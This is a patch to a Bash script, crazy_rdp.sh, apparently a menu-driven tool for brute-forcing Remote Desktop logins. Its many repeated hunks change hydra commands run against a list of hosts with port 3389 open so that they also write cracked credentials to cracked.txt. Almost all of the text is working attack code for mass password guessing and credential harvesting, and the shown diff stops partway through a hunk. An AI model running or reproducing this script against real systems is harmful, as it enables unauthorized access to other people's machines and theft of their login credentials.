@@ -13901,7 +13901,7 @@ read -p "   Menu selection : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Enter login {administrator, admin & etc.} : " loginbrute
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -13911,7 +13911,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -13921,7 +13921,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -13930,7 +13930,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -13974,7 +13974,7 @@ read -p "   Menu selection : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Enter login {administrator, admin & etc.} : " loginbrute
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -13984,7 +13984,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -13994,7 +13994,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -14003,7 +14003,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -14047,7 +14047,7 @@ read -p "   Menu selection : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Enter login {administrator, admin & etc.} : " loginbrute
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -14057,7 +14057,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -14067,7 +14067,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -14076,7 +14076,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -14120,7 +14120,7 @@ read -p "   Menu selection : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Enter login {administrator, admin & etc.} : " loginbrute
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -14130,7 +14130,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -14140,7 +14140,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -14149,7 +14149,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -14193,7 +14193,7 @@ read -p "   Menu selection : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Enter login {administrator, admin & etc.} : " loginbrute
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -14203,7 +14203,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -14213,7 +14213,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -14222,7 +14222,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -14266,7 +14266,7 @@ read -p "   Menu selection : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Enter login {administrator, admin & etc.} : " loginbrute
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -14276,7 +14276,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -14286,7 +14286,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -14295,7 +14295,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -14338,7 +14338,7 @@ read -p "   Menu selection : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Enter login {administrator, admin & etc.} : " loginbrute
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -14348,7 +14348,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -14358,7 +14358,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -14367,7 +14367,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -14410,7 +14410,7 @@ read -p "   Menu selection : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Enter login {administrator, admin & etc.} : " loginbrute
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -14420,7 +14420,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -14430,7 +14430,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -14439,7 +14439,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -14483,7 +14483,7 @@ read -p "   Menu selection : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Enter login {administrator, admin & etc.} : " loginbrute
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -14493,7 +14493,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -14503,7 +14503,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -14512,7 +14512,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -14555,7 +14555,7 @@ read -p "   Menu selection : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Enter login {administrator, admin & etc.} : " loginbrute
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -14565,7 +14565,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -14575,7 +14575,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -14584,7 +14584,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -14627,7 +14627,7 @@ read -p "   Menu selection : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Enter login {administrator, admin & etc.} : " loginbrute
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -14637,7 +14637,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -14647,7 +14647,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -14656,7 +14656,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -14699,7 +14699,7 @@ read -p "   Menu selection : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Enter login {administrator, admin & etc.} : " loginbrute
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -14709,7 +14709,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -14719,7 +14719,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -14728,7 +14728,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -14771,7 +14771,7 @@ read -p "   Menu selection : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Enter login {administrator, admin & etc.} : " loginbrute
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -14781,7 +14781,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -14791,7 +14791,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -14800,7 +14800,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -14843,7 +14843,7 @@ read -p "   Menu selection : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Enter login {administrator, admin & etc.} : " loginbrute
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -14853,7 +14853,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -14863,7 +14863,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -14872,7 +14872,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -14916,7 +14916,7 @@ read -p "   Menu selection : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Enter login {administrator, admin & etc.} : " loginbrute
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -14926,7 +14926,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -14936,7 +14936,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -14945,7 +14945,7 @@ fi
 
 if [ $brutmenu = "4" ]; then
 echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -14988,7 +14988,7 @@ read -p "   Menu selection : " brutmenu
 if [ $brutmenu = "1" ]; then
 read -p "Enter login {administrator, admin & etc.} : " loginbrute
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -l $loginbrute -P $passlist -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -14998,7 +14998,7 @@ fi
 if [ $brutmenu = "2" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter Password {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
+hydra -L $loginlist -p $passbrute -t 4 -W 3 -o $PWD/cracked.txt -M $PWD/open3389 rdp
 read -p " Press enter to move to the Main menu "
 
 ./crazy_rdp.sh
@@ -15008,7 +15008,7 @@ fi
 if [ $brutmenu = "3" ]; then
 read -p "Enter the path to the file with a list of usernames {'/home/dictionary/users'}: " loginlist
 read -p "Enter the path to the file with a list of passwords {'/home/dictionary/pass'}: " passlist
